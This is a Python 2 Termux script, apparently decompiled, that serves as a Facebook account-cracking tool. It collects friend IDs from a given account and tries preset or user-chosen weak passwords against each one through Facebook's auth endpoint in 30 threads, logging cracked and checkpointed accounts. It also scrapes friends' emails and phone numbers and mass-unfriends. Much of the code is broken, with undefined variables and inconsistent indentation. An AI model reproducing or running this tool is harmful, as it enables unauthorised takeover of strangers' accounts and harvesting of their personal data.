#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#Code By 𝐍𝐈𝐊𝐈
#Credit 𝐌𝐫. 𝐍𝐈𝐊𝐈
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

bd = random.randint(10000000.0, 90000000.0)
sim = random.randint(20000, 40000)
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(1e7, 9e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo ="""
    \033[1;96m 🄼 🅁.
    \033[1;92m
    \033[1;92m░█▄─░█ 　 ▀█▀ 　 ░█─▄▀ 　 ▀█▀ 
    \033[1;92m░█░█░█ 　 ░█─ 　 ░█▀▄─ 　 ░█─ 
    \033[1;93m░█──▀█ 　 ▄█▄ 　 ░█─░█ 　 ▄█▄
    \033[1;93m

\033[1;92m-----------------------------------------------
\033[1;92m>> AUTHOR   :   𝐌𝐫. 𝐍𝐈𝐊𝐈
\033[1;92m>> FACEBOOK : Niki.Cyber404
\033[1;92m>> YOUTUBE  : JAMES NIKI
\033[1;92m-----------------------------------------------"""

                   
def main():
	os.system("clear")
	print(logo)
	print("")
	print(" \x1b[1;92m    \tMain menu")
	print("")
	os.system('echo -e "-----------------------------------------------"| lolcat')
	print(" \x1b[1;92m     [1] Aik press kro\n")
	os.system('echo -e "-----------------------------------------------"| lolcat')
	print("")
	os.system('xdg-open https://www.facebook.com/Niki.Cyber404')
	log_sel()
def log_sel():
	sel = raw_input(" Choose an option: ")
	if sel =="1":
		login()
	elif sel =="2":
		ran()
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;91m  \tFacebook login")
		print("")
		os.system('echo -e "-----------------------------------------------"| lolcat')
		print(" \x1b[1;91m   [1] FACEBOOK ID/PASS LOGIN\n")
		print(" \x1b[1;92m   [2] FACEBOOK TOKEN LOGIN\n")
		print("  \x1b[1;91m  [3] Back ")
		os.system('echo -e "-----------------------------------------------"| lolcat')
		print("")
		log_select()
def log_select():
	sel = raw_input(" Choose an option: ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="3":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("")
		print("\tFacebook id/pass login")
		print("")
		uid = raw_input(" Uid: ")
		passw = raw_input(" Password: ")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("access_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        os.system('echo -e "-----------------------------------------------"| lolcat')
        token = raw_input        (" Paste token here: ")
        os.system('echo -e "-----------------------------------------------"| lolcat')
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("   Welcome: "+name)
    print("")
    print("    Free mode :Actvited")
    print("")
    print("")
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print(logo)
	print("email   : +n")
	print("key      : "+f)
	print("[✓] Name : "+name)
	print("[✓] ID   : "+id)
	print (50*"-")
	print
	print ("[1] Crack Menu")
	print ("[2] Crack With Pass Choice")
	print ("[3] Grab Emails")
	print ("[4] Grab Mobile Numbers")
	print ("[5] Unfriend with one click")
	print ("[6] Update BXI Tool")
	print ("[7] Follow Me On Facebook")
	print ("[8] Log Out")
	print ("[0] Exit            ")
	os.system('echo -e "-----------------------------------------------"| lolcat')
    print (50*"-")
	action()


def action():
	chb = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if chb =="":
		print ("[!] Fill in correctly")
		action()
	elif chb =="1":
	    crack_menu()
	elif chb =="2":
		choice_menu()
	elif chb =="3":
	    cb()
	    gbmail()
	elif chb =="4":
	    gbnmbr()
	elif chb =="5":
	    unfriend()
	elif chb =="6":
	    os.system("pip2 install --upgrade bxin")
	    cb()
	    print (logo)
	    psb("100%")
	    
	    
	elif chb =="7":
	    os.system("xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl")
	    time.sleep(1)
	    menu()
	elif chb =="8":
	    os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
	    print
	    psb(" Logout successfully")
	elif chb =="0":
		exb()
	else:
		print ("[!] Fill in correctly")
		action()


def crack_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	crack_action()

def crack_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		crack_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			crack_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			crack_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		crack_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			d=b["first_name"]
			e=d.replace(" ", "")
			f=e.lower()
			g=pf(f, 1)
			h=g.upper()
			i=rf(f, 1)
			c=h+i
			pass1="786786"
			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = c+"@@@786"
					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = c + "102030"
							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = "223344"
									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											pass5 = c + "786"
											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													pass6 = "123456"
													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															pass7 = c + "112233"
															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def choice_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	os.system("clear")
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	choice_action()

def choice_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		choice_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			choice_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input(" Put Password No 1 : ")
			pass2=raw_input(" Put Password No 2 : ")
			pass3=raw_input(" Put Password No 3 : ")
			pass4=raw_input(" Put Password No 4 : ")
			pass5=raw_input(" Put Password No 5 : ")
			pass6=raw_input(" Put Password No 6 : ")
			pass7=raw_input(" Put Password No 7 : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			choice_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		choice_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
		except OSError:
			pass
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q1 = json.loads(data1.text)
			if "access_token" in q1:
				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Zalim Cp] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q2 = json.loads(data2.text)
					if "access_token" in q2:
						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Zalim Cp] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q3 = json.loads(data3.text)
							if "access_token" in q3:
								print "\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Zalim Cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q4 = json.loads(data4.text)
									if "access_token" in q4:
										print "\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Zalim Cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q5 = json.loads(data5.text)
											if "access_token" in q5:
												print "\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Zalim Cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q6 = json.loads(data6.text)
													if "access_token" in q6:
														print "\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[CZalim Cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q7 = json.loads(data7.text)
															if "access_token" in q7:
																print "\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Zalim Cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbmail():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbm()

def agbm():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbm()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbmail()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "email" not in q:
				pass
			else:
				if "email" in q:
				    gms = q["email"]
				    print (user + "  |  " + gms + "\n")
				    bms.open("emails.txt", "a")
				    bms.write(user + "  |  " + gms + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : emails.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbnmbr():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbn()

def agbn():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbn()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbnmbr()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "mobile_phone" not in q:
				pass
			else:
				if "mobile_phone" in q:
				    gns = q["mobile_phone"]
				    gn=q["name"]
				    print (user + " | " + gn + gns + "\n")
				    bms.open("numbers.txt", "a")
				    bms.write(user + " | " + gn + gns + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : numbers.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def unfriend():
    os.system('clear')
    try:
        toket = open('/sdcard/Android/data/com.termux/token.log', 'r').read()
    except IOError:
        print 'token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 'To stop press CTRL then press Z'
        print 50*"-"
        print
        try:
            pek = session.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                name = i['name']
                id = i['id']
                session.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print ("[Unfriended]  "+name)

        except IndexError:
            pass
        except KeyboardInterrupt:
            exit()
    print " All friend has been removed"
    raw_input('[Back]')
    os.system("python2 .README.md")
    
if __name__ == "__main__":
	menu()


# Okay Decompiling b.py
